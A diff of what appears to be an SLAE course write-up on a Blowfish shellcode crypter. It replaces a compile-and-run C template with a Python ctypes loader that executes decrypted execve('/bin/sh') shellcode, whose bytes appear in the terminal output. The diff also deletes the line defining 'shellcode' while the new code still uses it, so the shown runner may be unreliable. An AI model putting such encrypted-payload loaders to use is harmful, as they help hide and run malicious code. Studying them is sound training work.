@@ -83,6 +83,7 @@ whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$
 ```term
 # Author: SLAE-27812 (Felipe Winsnes)
 
+from ctypes import *
 from Crypto.Cipher import Blowfish
 import sys, os
 
@@ -110,47 +111,21 @@ for x in bytearray(decrypt):
 
 print '"' + (decrypted) + '"'
 
-shellcode = '"' + (decrypted) + '"'
+buffer = create_string_buffer(shellcode, len(shellcode))
+print " "
+boom = cast(buffer, CFUNCTYPE(c_void_p))
 
-template = (
-
-"#include <stdio.h>" + "\r\n"
-"#include <string.h>" + "\r\n"
-
-"unsigned char code[] = \\" + '\r\n'
-+ shellcode + ";" + "\r\n" + "\r\n"
-
-"main()" + "\r\n"
-"{" + "\r\n"
-
-  'printf("\\n");' + "\r\n"
-
-        "int (*ret)() = (int(*)())code;" + "\r\n"
-
-        "ret();" + "\r\n"
-
-"}"
-
-)
-
-f = open ("test.c", "w")
-f.write(template)
-f.close()
-
-os.system("/usr/bin/gcc ./test.c -o test -fno-stack-protector -z execstack -Wall -Wno-implicit && /bin/rm ./test.c && ./test")
-os.system("/bin/rm ./test")
+boom()
 ```
 
-This is where things get tricky. Executing shellcode with Python is quite complex, and without WINE or ctypes it becomes quite hard. Therefore, I have chosen to generate a file that executes the shellcode and deletes the remaining files.
-
 ```term
-whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ python decrypt.py 
+whitecr0wz@SLAE:~/assignments/Assignment_7$ python decrypt.py 
 [*] Example: python decrypt.py <key> <IV number>
 
-whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ python decrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM
+whitecr0wz@SLAE:~/assignments/Assignment_7$ python decrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM 
 Original shellcode in hex escape sequence:
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80\x90\x90"
-
+ 
 $
 ```
 
